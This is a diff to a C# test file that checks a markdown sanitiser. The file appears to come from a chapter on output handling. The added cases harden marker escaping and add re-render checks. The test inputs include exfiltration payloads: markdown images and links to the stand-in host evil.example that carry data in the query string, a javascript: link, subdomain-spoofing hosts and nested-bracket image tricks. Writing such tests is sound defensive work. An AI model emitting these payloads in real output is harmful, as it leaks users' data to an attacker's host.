@@ -16,6 +16,7 @@
 // ============================================================================
 
 using System.Text.Encodings.Web;
+using System.Text.RegularExpressions;
 using Ch20.OutputHandling;
 using Microsoft.Data.Sqlite;
 
@@ -49,34 +50,45 @@ SafeMarkdown markdown = new(["contoso.example", "learn.microsoft.com"]);
     ("Docs: [DI](https://learn.microsoft.com/dotnet/core/extensions/dependency-injection)",
      "Docs: [DI](https://learn.microsoft.com/dotnet/core/extensions/dependency-injection)"),
     ("![status](https://evil.example/pixel.png?d=E-1001-balance-500)",
-     "[image removed: evil.example]"),
+     "\\[image removed: evil.example\\]"),
     ("[portal](https://contoso.example.evil.example/login)",
-     "portal [link removed: contoso.example.evil.example]"),
+     "portal \\[link removed: contoso.example.evil.example\\]"),
     ("[help](https://evil.example/?ref=contoso.example)",
-     "help [link removed: evil.example]"),
+     "help \\[link removed: evil.example\\]"),
     ("[click](javascript:alert(1))",
-     "click [link removed: not https]"),
+     "click \\[link removed: not https\\]"),
     ("[plain](http://contoso.example/policies)",
-     "plain [link removed: not https]"),
+     "plain \\[link removed: not https\\]"),
     // Forms a regex over [label](url) misses; a CommonMark renderer follows every one.
     ("![s](https://evil.example/p.png?d=E-1001-balance-500 \"status\")",
-     "[image removed: evil.example]"),
+     "\\[image removed: evil.example\\]"),
     ("![s]( https://evil.example/p.png?d=E-1001-balance-500)",
-     "[image removed: evil.example]"),
+     "\\[image removed: evil.example\\]"),
     ("![s][1]\n\n[1]: https://evil.example/p.png?d=E-1001-balance-500",
-     "[image removed: evil.example]\n\n[link definition removed: evil.example]"),
+     "\\[image removed: evil.example\\]\n\n\\[link definition removed: evil.example\\]"),
     ("<https://evil.example/?d=E-1001-balance-500>",
-     "[link removed: evil.example]"),
+     "\\[link removed: evil.example\\]"),
     ("[portal](https://evil.example/login 'Contoso portal')",
-     "portal [link removed: evil.example]"),
+     "portal \\[link removed: evil.example\\]"),
     ("<img src=\"https://evil.example/p.png?d=E-1001-balance-500\">",
-     "[html removed]"),
+     "\\[html removed\\]"),
+    // The marker must stay text: unescaped, "!" + "[image removed: ...]" + "(url)" is a new image.
+    ("!![a](https://evil.example/1)(//evil.example/p.png?d=E-1001)",
+     "!\\[image removed: evil.example\\](//evil.example/p.png?d=E-1001)"),
+    ("!![a](https://evil.example/1)(evil.example/p.png)",
+     "!\\[image removed: evil.example\\](evil.example/p.png)"),
+    ("[a](https://evil.example/1)(//evil.example/p.png?d=E-1001)",
+     "a \\[link removed: evil.example\\](//evil.example/p.png?d=E-1001)"),
 ];
 foreach ((string input, string expected) in links)
 {
     string rendered = markdown.Render(input);
-    Expect($"{Shown(input)} -> {Shown(rendered)}", rendered == expected);
+    // One pass must be enough: a second finds nothing to cut, and the HTML names no other host.
+    Expect($"{Shown(input)} -> {Shown(rendered)}", rendered == expected &&
+        markdown.Render(rendered) == rendered && !FetchesEvil(SafeMarkdown.ToHtml(rendered)));
 }
+static bool FetchesEvil(string html) =>
+    Regex.Matches(html, "(?:src|href)=\"([^\"]*)\"").Any(m => m.Groups[1].Value.Contains("evil.example", StringComparison.Ordinal));
 static string Shown(string s) => s.Replace("\n", "\\n", StringComparison.Ordinal);
 Expect("DEFECT REPRODUCED: a substring host check accepts contoso.example.evil.example",
     SafeMarkdown.NaiveSubstringCheck("https://contoso.example.evil.example/login", "contoso.example"));
